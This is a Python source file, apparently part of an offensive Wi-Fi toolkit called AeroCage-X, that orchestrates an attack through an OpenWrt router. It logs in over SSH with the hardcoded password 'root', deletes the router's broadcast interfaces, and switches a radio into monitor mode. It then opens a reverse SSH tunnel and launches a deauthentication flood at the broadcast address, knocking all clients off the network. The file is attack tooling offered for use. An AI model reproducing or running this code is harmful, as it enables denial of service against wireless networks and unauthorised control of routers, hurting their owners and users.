#!/usr/bin/env python3
"""
File Name: core_attack_orchestrator.py
Path: /home/kali/AeroCage-XV1.0.1/core/core_attack_orchestrator.py
Created Date: 2026-05-26
Version: 1.2.0
Description: Master Cyber Operations Orchestrator Engine for AeroCage-X.
             Decoupled architecture integrated with unified factories.
"""

import time
import threading
from pathlib import Path

# الاستيرادات المباشرة القياسية للنواة بنقاء هندسي قطعي
from core.system_guard import SystemGuard
from core.db_manager import DatabaseManager
from utils.opwrt_ssh_factory import OpWrtSSHFactory
from modules.strike_tunnel import StrikeTunnelEngine
from modules.strike_smart_fire import StrikeSmartFireEngine


class CoreAttackOrchestrator:
    """
    Main Tactical Mission Orchestrator Component.
    Manages operational states, watchdogs, and dynamic target pipelines.
    """

    def __init__(self, mission_context: dict):
        """تهيئة المايسترو المركزي وحقن مراجع التحكم والأجهزة الفرعية الموحدة"""
        SystemGuard.enforce_root_privileges("Core Attack Orchestrator")

        self.ctx = mission_context
        self.ap_ip = self.ctx.get("ap_ip")
        self.operation_active = False

        # اقتران الأب الاستخباري الموحد الجديد لـ SSH
        self.factory = OpWrtSSHFactory(ip=self.ap_ip, password="root")

        self.engines = {
            "db": DatabaseManager(),
            "tunnel": StrikeTunnelEngine(self.ap_ip, "root"),
            "fire": StrikeSmartFireEngine(self.ap_ip, "root")
        }

    def execute_protected_mission_pipeline(self) -> bool:
        """تشغيل الأنبوب التنفيذي المتسلسل برشاقة تامة وعزل الأوامر عتادياً"""
        band = self.ctx.get("band")
        chan = self.ctx.get("channel")
        
        actual_radio = self.factory.get_active_radio_by_band(band)
        iface_pool = self.factory.get_linux_kernel_interfaces(actual_radio)
        if not iface_pool:
            iface_pool = ["phy0-ap0" if actual_radio == "radio0" else "phy1-ap0"]

        print("[*] [Step 3] Erasing target broadcast interfaces via UCI")
        for iface in iface_pool:
            cmd_del = f"uci delete wireless.{iface}"
            self.factory.execute_remote_cmd(cmd_del)

        # الإنشاء المتسلسل لواجهات المراقبة ديناميكياً وقفل التردد دون تخبيص
        idx_1 = self.factory.get_sequential_interface_index()
        cmd_m1 = f"uci set wireless.wifinet{idx_1}=wifi-iface"
        self.factory.execute_remote_cmd(cmd_m1)
        self.factory.execute_remote_cmd(f"uci set wireless.wifinet{idx_1}.device='{actual_radio}'")
        self.factory.execute_remote_cmd(f"uci set wireless.wifinet{idx_1}.mode='monitor'")
        
        set_ch = f"uci set wireless.{actual_radio}.channel='{chan}'"
        self.factory.execute_remote_cmd(set_ch)
        self.factory.execute_remote_cmd("uci commit wireless")

        print("[*] [Step 4] Dispatching synchronized WiFi Reload vector")
        self.factory.execute_remote_cmd(f"wifi reload {actual_radio}")
        time.sleep(3)

        # استكشاف الاسم الحقيقي الحركي المتولد لواجهة المراقبة وتطهيره
        actual_mon = "wlan0-3" if actual_radio == "radio0" else "wlan1-3"

        # حساب البورتات تتابيعاً ديناميكياً لتردد الـ 2G والـ 5G لحظر التداخل للـ 20 أكسس
        local_port = 6666 if band == "2G" else 7777
        remote_port = int(f"6661" if band == "2G" else "7771")

        tunnel_success = self.engines["tunnel"].establish_reverse_ssh_tunnel(
            local_port, remote_port
        )
        if not tunnel_success:
            return False

        self.engines["fire"].launch_targeted_deauth_storm_safe(
            mon_iface=actual_mon, target_bssid="FF:FF:FF:FF:FF:FF"
        )

        self.operation_active = True
        threading.Thread(
            target=self._watchdog_core_worker,
            args=(actual_radio, remote_port),
            daemon=True
        ).start()

        return True

    def _watchdog_core_worker(self, radio_name: str, tunnel_port: int):
        """الحساس المزدوج: يراقب استقرار معالج الراوتر البعيد ويتابع قاذف كالي حياً"""
        print(f"[🪐 Watchdog] Active monitoring for {radio_name} on port {tunnel_port}.")

        while self.operation_active:
            try:
                time.sleep(5)
                log_path = Path(__file__).resolve().parent.parent / "data"
                latest_files = list(log_path.glob("strike_capture-*.csv"))

                if latest_files:
                    latest_file = max(latest_files, key=lambda p: p.stat().st_mtime)
                    if latest_file.stat().st_size > 0:
                        print(f"[📊 Sensor] Writing data inside: {latest_file.name}")

            except (IOError, OSError, ValueError, KeyError) as e:
                print(f"[-] Operational Exception inside sensors loop: {e}")

    def recover_hardware_defaults(self):
        """إرجاع الأكسس إلى حالته الطبيعية وتفعيل انترفيس البث وتوليد تقرير الأصلي"""
        self.operation_active = False
        print("\n========================================================")
        print(" 🔄 [Mission Finished] Restoring original hardware state")
        print("========================================================\n")

        self.engines["tunnel"].close_tunnel_bridge(6661)
        self.factory.execute_remote_cmd(
            "uci revert wireless && uci commit wireless && wifi"
        )
        print("[+] Operational Report: Core interfaces brought back alive successfully.")


if __name__ == "__main__":
    print("[+] Core Attack Orchestrator framework validation confirmed.")
